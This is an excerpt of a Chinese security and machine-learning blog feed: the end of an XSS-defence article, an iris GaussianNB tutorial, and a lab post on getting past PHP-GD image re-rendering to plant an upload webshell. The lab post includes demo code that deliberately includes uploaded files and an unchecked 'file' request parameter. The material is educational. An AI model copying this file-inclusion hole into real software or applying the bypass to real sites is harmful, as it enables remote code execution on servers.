$&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>代码采用了Anti-CSRF token机制</li><li>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。</li><li>预定义的字符是：<ul><li>&amp; （和号）成为 &amp;</li><li>“ （双引号）成为 “</li><li>‘ （单引号）成为 ‘</li><li>&lt; （小于）成为 &lt;</li><li>&gt; （大于）成为 &gt;</li></ul></li></ul></li></ul><h2 id="0x03-防范措施"><a href="#0x03-防范措施" class="headerlink" title="0x03 防范措施"></a>0x03 防范措施</h2><h3 id="3-1-HttpOnly-防止劫取-Cookie"><a href="#3-1-HttpOnly-防止劫取-Cookie" class="headerlink" title="3.1 HttpOnly 防止劫取 Cookie"></a>3.1 <strong>HttpOnly 防止劫取 Cookie</strong></h3><ul><li>攻击者可以通过注入恶意脚本获取用户的 Cookie 信息。通常 Cookie 中都包含了用户的登录凭证信息，攻击者在获取到 Cookie 之后，则可以发起 Cookie 劫持攻击。所以，严格来说，HttpOnly 并非阻止 XSS 攻击，而是能阻止 XSS 攻击后的 Cookie 劫持攻击。 </li></ul><h3 id="3-2-用户端输入检查"><a href="#3-2-用户端输入检查" class="headerlink" title="3.2 用户端输入检查"></a>3.2 <strong>用户端输入检查</strong></h3><ul><li><p>对于用户的任何输入要进行检查、过滤和转义。</p></li><li><p>建立可信任的字符和 HTML 标签白名单，对于不在白名单之列的字符或者标签进行过滤或编码。 </p></li><li><p>HTML转义：对用户输入的内容进行HTML转义，转义后可以确保用户输入的内容在浏览器中作为文本显示，而不是作为代码解析。 </p></li><li><p>一些前端框架中，都会有一份 decodingMap， 用于对用户输入所包含的特殊字符或标签进行编码或过滤，如 &lt;，&gt;，script，防止 XSS 攻击：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; vuejs 中的 decodingMap</span><br><span class="line">&#x2F;&#x2F; 在 vuejs 中，如果输入带 script 标签的内容，会直接过滤掉</span><br><span class="line">const decodingMap &#x3D; &#123;</span><br><span class="line">  &#39;&lt;&#39;: &#39;&lt;&#39;,</span><br><span class="line">  &#39;&gt;&#39;: &#39;&gt;&#39;,</span><br><span class="line">  &#39;&quot;&#39;: &#39;&quot;&#39;,</span><br><span class="line">  &#39;&amp;&#39;: &#39;&amp;&#39;,</span><br><span class="line">  &#39;</span><br><span class="line">  &#39;: &#39;\n&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-3-服务端输出检查"><a href="#3-3-服务端输出检查" class="headerlink" title="3.3 服务端输出检查"></a><strong>3.3 服务端输出检查</strong></h3><ul><li>用户的输入会存在问题，服务端的输出也会存在问题。一般来说，除富文本的输出外，在变量输出到 HTML 页面时，可以使用编码或转义的方式来防御 XSS 攻击。例如利用 sanitize-html 对输出内容进行有规则的过滤之后再输出到页面中。 </li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【机器学习算法】鸢尾花数据集GaussianNB分类预测</title>
      <link href="/2020/04/05/%E9%B8%A2%E5%B0%BE%E8%8A%B1%E6%95%B0%E6%8D%AE%E9%9B%86GaussianNB%E5%88%86%E7%B1%BB%E9%A2%84%E6%B5%8B/"/>
      <url>/2020/04/05/%E9%B8%A2%E5%B0%BE%E8%8A%B1%E6%95%B0%E6%8D%AE%E9%9B%86GaussianNB%E5%88%86%E7%B1%BB%E9%A2%84%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="本文主要内容"><a href="#本文主要内容" class="headerlink" title="本文主要内容"></a>本文主要内容</h3><p> UC Irvine具有用于存储各种数据的大型存储库。 本文使用<strong>鸢尾花数据集</strong>（<a href="https://archive.ics.uci.edu/ml/datasets/Iris）进行实验。" target="_blank" rel="noopener">https://archive.ics.uci.edu/ml/datasets/Iris）进行实验。</a> 为分类任务实施<strong>朴素贝叶斯分类器</strong>。 这项试验，随机抽取70％的实例进行训练，其余的则进行测试。 重复试验10次并计算平均准确度。 由于特征是连续变量，因此您可能需要在概率计算中使用<strong>高斯模型</strong>。</p><a id="more"></a><h3 id="0x01-实验流程"><a href="#0x01-实验流程" class="headerlink" title="0x01 实验流程"></a>0x01 实验流程</h3><h4 id="1-1-加载鸢尾花数据集"><a href="#1-1-加载鸢尾花数据集" class="headerlink" title="1.1 加载鸢尾花数据集"></a>1.1 加载鸢尾花数据集</h4><ul><li>采用sklearn.datasets模块导入load_iris数据集</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># load the iris dataset </span></span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_iris </span><br><span class="line">iris = load_iris()</span><br></pre></td></tr></table></figure><h4 id="1-2-存储特征矩阵和响应向量"><a href="#1-2-存储特征矩阵和响应向量" class="headerlink" title="1.2 存储特征矩阵和响应向量"></a>1.2 存储特征矩阵和响应向量</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># store the feature matrix (X) and response vector (y) </span></span><br><span class="line">X = iris.data </span><br><span class="line">y = iris.target</span><br></pre></td></tr></table></figure><h4 id="1-3-将X和y分为训练和测试集"><a href="#1-3-将X和y分为训练和测试集" class="headerlink" title="1.3 将X和y分为训练和测试集"></a>1.3 将X和y分为训练和测试集</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># splitting X and y into training and testing sets </span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split </span><br><span class="line">X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class="number">0.3</span>, random_state=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h5 id="sklearn-model-selection-train-test-split用法"><a href="#sklearn-model-selection-train-test-split用法" class="headerlink" title="sklearn.model_selection.train_test_split用法"></a><strong>sklearn.model_selection.train_test_split</strong>用法</h5><blockquote><ul><li><p>作用：将数组或矩阵拆分为训练集和测试集</p></li><li><p>语法：<code>sklearn.model_selection.train_test_split(*arrays, **options)</code></p></li><li><p>train_test_split里面常用的因数（arguments）介绍：</p><blockquote><ul><li>arrays：分割对象同样长度的列表或者numpy arrays，矩阵。</li><li>test_size：两种指定方法。1：指定小数。小数范围在0.0~0.1之间，它代表test集占据的比例。2：指定整数。整数的大小必须在这个数据集个数范围内，总不能指定一个数超出了数据集的个数范围吧。要是test_size在没有指定的场合，可以通过train_size来指定。（两个是对应关系）。如果train_size也没有指定，那么默认值是0.25.</li><li>train_size：和test_size相似。</li><li>random_state:这是将分割的training和testing集合打乱的个数设定。如果不指定的话，也可以通过numpy.random来设定随机数。</li><li>shuffle和straify不常用。straify就是将数据分层。</li></ul></blockquote></li><li><p>返回值：将输入列表拆分为训练和测试集</p></li></ul></blockquote><h5 id="train-test-split-用法举例："><a href="#train-test-split-用法举例：" class="headerlink" title="train_test_split 用法举例："></a>train_test_split 用法举例：</h5><blockquote><p>这个数据集 4列，12行</p></blockquote><ul><li>使用pandas模块，制作数据集</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line">namelist = pd.DataFrame(&#123;</span><br><span class="line">    <span class="string">"name"</span> : [<span class="string">"Suzuki"</span>, <span class="string">"Tanaka"</span>, <span class="string">"Yamada"</span>, <span class="string">"Watanabe"</span>, <span class="string">"Yamamoto"</span>,</span><br><span class="line">             <span class="string">"Okada"</span>, <span class="string">"Ueda"</span>, <span class="string">"Inoue"</span>, <span class="string">"Hayashi"</span>, <span class="string">"Sato"</span>,</span><br><span class="line">              <span class="string">"Hirayama"</span>, <span class="string">"Shimada"</span>],</span><br><span class="line">    <span class="string">"age"</span>: [<span class="number">30</span>, <span class="number">40</span>, <span class="number">55</span>, <span class="number">29</span>, <span class="number">41</span>, <span class="number">28</span>, <span class="number">42</span>, <span class="number">24</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">49</span>, <span class="number">53</span>],</span><br><span class="line">    <span class="string">"department"</span>: [<span class="string">"HR"</span>, <span class="string">"Legal"</span>, <span class="string">"IT"</span>, <span class="string">"HR"</span>, <span class="string">"HR"</span>, <span class="string">"IT"</span>,</span><br><span class="line">                  <span class="string">"Legal"</span>, <span class="string">"Legal"</span>, <span class="string">"IT"</span>, <span class="string">"HR"</span>, <span class="string">"Legal"</span>, <span class="string">"Legal"</span>],</span><br><span class="line">    <span class="string">"attendance"</span>: [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line"> &#125;)</span><br><span class="line">namelist</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>name</th>      <th>age</th>      <th>department</th>      <th>attendance</th>    </tr>  </thead>  <tbody>    <tr>      <td>0</td>      <td>Suzuki</td>      <td>30</td>      <td>HR</td>      <td>1</td>    </tr>    <tr>      <td>1</td>      <td>Tanaka</td>      <td>40</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>2</td>      <td>Yamada</td>      <td>55</td>      <td>IT</td>      <td>1</td>    </tr>    <tr>      <td>3</td>      <td>Watanabe</td>      <td>29</td>      <td>HR</td>      <td>0</td>    </tr>    <tr>      <td>4</td>      <td>Yamamoto</td>      <td>41</td>      <td>HR</td>      <td>1</td>    </tr>    <tr>      <td>5</td>      <td>Okada</td>      <td>28</td>      <td>IT</td>      <td>1</td>    </tr>    <tr>      <td>6</td>      <td>Ueda</td>      <td>42</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>7</td>      <td>Inoue</td>      <td>24</td>      <td>Legal</td>      <td>0</td>    </tr>    <tr>      <td>8</td>      <td>Hayashi</td>      <td>33</td>      <td>IT</td>      <td>0</td>    </tr>    <tr>      <td>9</td>      <td>Sato</td>      <td>39</td>      <td>HR</td>      <td>1</td>    </tr>    <tr>      <td>10</td>      <td>Hirayama</td>      <td>49</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>11</td>      <td>Shimada</td>      <td>53</td>      <td>Legal</td>      <td>1</td>    </tr>  </tbody></table></div><ul><li>将testing数据指定为0.3（test_size=0.3），从而将testing和training 集合分开。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namelist_train, namelist_test = train_test_split(namelist, test_size=<span class="number">0.3</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namelist_train</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>name</th>      <th>age</th>      <th>department</th>      <th>attendance</th>    </tr>  </thead>  <tbody>    <tr>      <td>3</td>      <td>Watanabe</td>      <td>29</td>      <td>HR</td>      <td>0</td>    </tr>    <tr>      <td>5</td>      <td>Okada</td>      <td>28</td>      <td>IT</td>      <td>1</td>    </tr>    <tr>      <td>1</td>      <td>Tanaka</td>      <td>40</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>4</td>      <td>Yamamoto</td>      <td>41</td>      <td>HR</td>      <td>1</td>    </tr>    <tr>      <td>10</td>      <td>Hirayama</td>      <td>49</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>9</td>      <td>Sato</td>      <td>39</td>      <td>HR</td>      <td>1</td>    </tr>    <tr>      <td>11</td>      <td>Shimada</td>      <td>53</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>2</td>      <td>Yamada</td>      <td>55</td>      <td>IT</td>      <td>1</td>    </tr>  </tbody></table></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namelist_test</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>name</th>      <th>age</th>      <th>department</th>      <th>attendance</th>    </tr>  </thead>  <tbody>    <tr>      <td>7</td>      <td>Inoue</td>      <td>24</td>      <td>Legal</td>      <td>0</td>    </tr>    <tr>      <td>6</td>      <td>Ueda</td>      <td>42</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>8</td>      <td>Hayashi</td>      <td>33</td>      <td>IT</td>      <td>0</td>    </tr>    <tr>      <td>0</td>      <td>Suzuki</td>      <td>30</td>      <td>HR</td>      <td>1</td>    </tr>  </tbody></table></div><ul><li>接下来是将testing数据指定为具体数目。test_size=5</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">namelist_train, namelist_test = train_test_split(namelist, test_size=<span class="number">5</span>)</span><br><span class="line">namelist_test</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>name</th>      <th>age</th>      <th>department</th>      <th>attendance</th>    </tr>  </thead>  <tbody>    <tr>      <td>0</td>      <td>Suzuki</td>      <td>30</td>      <td>HR</td>      <td>1</td>    </tr>    <tr>      <td>1</td>      <td>Tanaka</td>      <td>40</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>6</td>      <td>Ueda</td>      <td>42</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>10</td>      <td>Hirayama</td>      <td>49</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>11</td>      <td>Shimada</td>      <td>53</td>      <td>Legal</td>      <td>1</td>    </tr>  </tbody></table></div><ul><li>接下来将training data 指定为0.5（training_size=0.5）</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">namelist_train, namelist_test = train_test_split(namelist, test_size=<span class="literal">None</span>, train_size=<span class="number">0.5</span>)</span><br><span class="line">namelist_train</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>name</th>      <th>age</th>      <th>department</th>      <th>attendance</th>    </tr>  </thead>  <tbody>    <tr>      <td>7</td>      <td>Inoue</td>      <td>24</td>      <td>Legal</td>      <td>0</td>    </tr>    <tr>      <td>6</td>      <td>Ueda</td>      <td>42</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>5</td>      <td>Okada</td>      <td>28</td>      <td>IT</td>      <td>1</td>    </tr>    <tr>      <td>3</td>      <td>Watanabe</td>      <td>29</td>      <td>HR</td>      <td>0</td>    </tr>    <tr>      <td>0</td>      <td>Suzuki</td>      <td>30</td>      <td>HR</td>      <td>1</td>    </tr>    <tr>      <td>9</td>      <td>Sato</td>      <td>39</td>      <td>HR</td>      <td>1</td>    </tr>  </tbody></table></div><ul><li>shuffle功能</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">namelist_train, namelist_test = train_test_split(namelist, shuffle=<span class="literal">False</span>)</span><br><span class="line">namelist_test</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>name</th>      <th>age</th>      <th>department</th>      <th>attendance</th>    </tr>  </thead>  <tbody>    <tr>      <td>9</td>      <td>Sato</td>      <td>39</td>      <td>HR</td>      <td>1</td>    </tr>    <tr>      <td>10</td>      <td>Hirayama</td>      <td>49</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>11</td>      <td>Shimada</td>      <td>53</td>      <td>Legal</td>      <td>1</td>    </tr>  </tbody></table></div><h4 id="1-4-使用高斯模型训练数据集"><a href="#1-4-使用高斯模型训练数据集" class="headerlink" title="1.4 使用高斯模型训练数据集"></a>1.4 使用高斯模型训练数据集</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># training the model on training set </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#引入高斯朴素贝叶斯</span></span><br><span class="line"><span class="keyword">from</span> sklearn.naive_bayes <span class="keyword">import</span> GaussianNB </span><br><span class="line"><span class="comment"># 实例化</span></span><br><span class="line">gnb = GaussianNB() </span><br><span class="line"><span class="comment">#训练数据 fit相当于train</span></span><br><span class="line">gnb.fit(X_train, y_train)</span><br></pre></td></tr></table></figure><pre><code>GaussianNB(priors=None, var_smoothing=1e-09)</code></pre><h4 id="1-5-测试集预测"><a href="#1-5-测试集预测" class="headerlink" title="1.5 测试集预测"></a>1.5 测试集预测</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># making predictions on the testing set </span></span><br><span class="line">y_pred = gnb.predict(X_test)</span><br></pre></td></tr></table></figure><h4 id="1-6-比较预测值和实际值"><a href="#1-6-比较预测值和实际值" class="headerlink" title="1.6 比较预测值和实际值"></a>1.6 比较预测值和实际值</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># comparing actual response values (y_test) with predicted response values (y_pred) </span></span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> metrics </span><br><span class="line">print(<span class="string">"Gaussian Naive Bayes model accuracy(in %):"</span>, metrics.accuracy_score(y_test, y_pred)*<span class="number">100</span>)</span><br></pre></td></tr></table></figure><pre><code>Gaussian Naive Bayes model accuracy(in %): 93.33333333333333</code></pre><ul><li>sklearn.metrics中的评估方法介绍（<a href="https://blog.csdn.net/cherdw/article/details/55813071）" target="_blank" rel="noopener">https://blog.csdn.net/cherdw/article/details/55813071）</a></li></ul><h4 id="1-7-完整代码"><a href="#1-7-完整代码" class="headerlink" title="1.7 完整代码"></a>1.7 完整代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># load the iris dataset </span></span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_iris </span><br><span class="line">iris = load_iris() </span><br><span class="line"></span><br><span class="line"><span class="comment"># store the feature matrix (X) and response vector (y) </span></span><br><span class="line">X = iris.data </span><br><span class="line">y = iris.target </span><br><span class="line"></span><br><span class="line"><span class="comment"># splitting X and y into training and testing sets </span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split </span><br><span class="line">X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class="number">0.3</span>, random_state=<span class="number">1</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># training the model on training set </span></span><br><span class="line"><span class="keyword">from</span> sklearn.naive_bayes <span class="keyword">import</span> GaussianNB </span><br><span class="line">gnb = GaussianNB() </span><br><span class="line">gnb.fit(X_train, y_train) </span><br><span class="line"></span><br><span class="line"><span class="comment"># making predictions on the testing set </span></span><br><span class="line">y_pred = gnb.predict(X_test) </span><br><span class="line"></span><br><span class="line"><span class="comment"># comparing actual response values (y_test) with predicted response values (y_pred) </span></span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> metrics </span><br><span class="line">print(<span class="string">"Gaussian Naive Bayes model accuracy(in %):"</span>, metrics.accuracy_score(y_test, y_pred)*<span class="number">100</span>)</span><br></pre></td></tr></table></figure><pre><code>Gaussian Naive Bayes model accuracy(in %): 93.33333333333333</code></pre>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
          <category> 机器学习算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> GaussianNB </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【文件上传（五）：高级利用】5.1 图片重绘</title>
      <link href="/2020/04/03/5.1%20%E5%9B%BE%E7%89%87%E9%87%8D%E7%BB%98/"/>
      <url>/2020/04/03/5.1%20%E5%9B%BE%E7%89%87%E9%87%8D%E7%BB%98/</url>
      
        <content type="html"><![CDATA[<h3 id="本文主要内容"><a href="#本文主要内容" class="headerlink" title="本文主要内容"></a>本文主要内容</h3><ul><li>重绘图的概念</li><li>图片重绘实例分析，PHP输出图像函数</li></ul><a id="more"></a><h3 id="0x01-重绘图"><a href="#0x01-重绘图" class="headerlink" title="0x01 重绘图"></a>0x01 重绘图</h3><blockquote><p>应用调用图片库对上传的图片进行了图像转换，所以即使将图片与文件合并，也会将尾部转换掉，无法使用常规方法上传webshell.</p></blockquote><ul><li><p>如何绕过</p><ul><li>将正常图片用目标使用的图像库进行转换</li><li>寻找转换前后两次未变的部分</li><li>将未变部分替换为欲上传的WebShell</li><li>将替换后的文件进行图像文件转换，看是否转换后仍存在替换后部分</li></ul></li><li><p>比如：</p><p>  转换前：1233333abcdefg[1111222333]sdas213</p><p>  转换后：xsadssdddsdddd[1111222333]2313322</p></li></ul><h3 id="0x02-实战练习"><a href="#0x02-实战练习" class="headerlink" title="0x02 实战练习"></a>0x02 实战练习</h3><ul><li>参考代码地址<br><a href="https://github.com/RickGray/Bypass-PHP-GD-Process-To-RCE" target="_blank" rel="noopener">https://github.com/RickGray/Bypass-PHP-GD-Process-To-RCE</a></li></ul><h4 id="2-1-部署"><a href="#2-1-部署" class="headerlink" title="2.1 部署"></a>2.1 部署</h4><ul><li>将参考代码地址项目下载，并放置在windows+phpstudy WWW目录下，并访问，部署完成状态<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20403upload01.png" alt=""></li></ul><h4 id="2-2-上传代码"><a href="#2-2-上传代码" class="headerlink" title="2.2 上传代码"></a>2.2 上传代码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2&gt;This is a quick demo to show the process of bypass PHP-GD.&lt;/h2&gt;</span><br><span class="line">&lt;h3&gt;Choose image to upload, then <span class="string">"include $upload_path;"</span> to show some data.&lt;/h3&gt;</span><br><span class="line">&lt;h3&gt;<span class="keyword">or</span>, <span class="keyword">use</span> <span class="title">parameter</span> "<span class="title">file</span>" <span class="title">to</span> <span class="title">include</span> <span class="title">file</span>, <span class="title">e</span>.<span class="title">g</span>. <span class="title">http</span>://<span class="title">xxxxx</span>/<span class="title">index</span>.<span class="title">php</span>?<span class="title">file</span>=&amp;<span class="title">lt</span>;something&amp;gt;&lt;/h3&gt;</span><br><span class="line"></span><br><span class="line">&lt;form method=<span class="string">"POST"</span> action=<span class="string">""</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"upfile"</span> value=<span class="string">""</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"upload"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gd_process</span><span class="params">($src_img, $dst_img)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment"># you can redefine the GD process</span></span><br><span class="line">        $im = imagecreatefromgif($src_img);</span><br><span class="line">        imagegif($im, $dst_img);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        printf(<span class="string">"%s\n"</span>, $e-&gt;getMessage());</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_FILES[<span class="string">"upfile"</span>])) &#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upfile'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line"></span><br><span class="line">    $img_info = getimagesize($temp_file);</span><br><span class="line">    <span class="keyword">if</span> ($img_info[<span class="number">2</span>] == <span class="string">'1'</span>) &#123;</span><br><span class="line">        $upload_file = <span class="string">"test.gif"</span>;</span><br><span class="line">        <span class="keyword">if</span> (!gd_process($temp_file, $upload_file)) &#123;</span><br><span class="line">            printf(<span class="string">"Image upload process error, please check out.\n"</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        printf(<span class="string">"Path: %s, image upload successful!\n"</span>, $upload_file);</span><br><span class="line">        <span class="keyword">include</span> $upload_file;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        printf(<span class="string">"Image type not support in this demo, GIF please...\n"</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">"file"</span>])) &#123;</span><br><span class="line">    <span class="keyword">include</span> $_REQUEST[<span class="string">"file"</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p><code>imagecreatefromgif()</code>函数</p><blockquote><ul><li>由文件或 URL 创建一个新图象</li><li>描述：<code>imagecreatefromgif ( string $filename )</code>返回一图像标识符，代表了从给定的文件名取得的图像</li></ul></blockquote></li><li><p>PHP 输出图像</p><ul><li><code>imagegif()、imagejpeg()、imagepng() 和 imagewbmp()</code>函数分别允许以 GIF、JPEG、PNG 和 WBMP 